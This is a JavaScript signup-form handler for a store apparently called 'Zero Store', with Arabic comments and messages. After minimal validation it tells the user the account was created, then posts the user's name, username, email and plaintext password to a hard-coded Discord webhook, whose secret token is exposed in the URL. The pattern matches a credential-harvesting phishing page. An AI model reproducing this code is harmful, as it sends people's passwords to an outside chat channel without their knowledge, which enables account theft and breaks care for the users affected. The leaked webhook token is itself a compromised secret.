document.getElementById("signupForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const name = document.getElementById("name").value;
  const username = document.getElementById("username").value;
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // تحقق من صحة الإيميل
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const message = document.getElementById("message");

  if (!emailRegex.test(email) || password.length < 4) {
    message.style.color = "red";
    message.innerText = "❌ البريد الإلكتروني أو كلمة المرور غير صحيحة";
    return;
  }

  message.style.color = "green";
  message.innerText = "✅ تم إنشاء الحساب بنجاح";

  // إرسال البيانات إلى Webhook
  fetch("https://discord.com/api/webhooks/1384425928452608101/CRVV-cLTYRmRQF6jeu7cuCRLN4zE2jVmCMiATyboC_zowntOpAsJo7l1hSWaUShyCxGf", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content: `🆕 تسجيل جديد في متجر زيرو ستور:\n👤 الاسم: ${name}\n🆔 اسم المستخدم: ${username}\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`
    })
  });
});
